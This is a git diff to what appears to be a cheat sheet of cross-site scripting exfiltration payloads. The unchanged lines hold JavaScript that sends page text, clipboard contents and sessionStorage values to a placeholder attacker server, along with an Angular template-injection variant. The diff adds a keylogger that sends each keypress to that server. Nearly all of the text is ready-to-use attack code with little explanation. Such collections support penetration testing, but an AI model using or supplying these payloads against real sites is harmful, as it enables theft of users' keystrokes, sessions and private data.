@@ -35,6 +35,10 @@ fetch("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 ```javascript
 setTimeout(async()=>fetch("https://$ATTACKER_SERVER/?copy="+(await window.navigator.clipboard.readText())), 1000)
 ```
+### KEYLOGGER WITH $FETCH *(Script modified from Chentetrans logger)*
+```javascript
+var l = ""; document.onkeypress = function(e){;l+=e.key;fetch("https://$ATTACKER_SERVER/?q="+ l);}
+```
 ## JQuery AJAX
 ### GET VALUE FROM LOCAL STORAGE AND $.GET
 ```javascript
@@ -65,4 +69,3 @@ For Angular template injection you should be able to use the above payloads in c
 ```javascript
 {{constructor.constructor('fetch("https://$ATTACKER_SERVER/?exfil="+sessionStorage.getItem("$ITEM_FROM_LOCAL_STORAGE"))')()}}
 ```
-
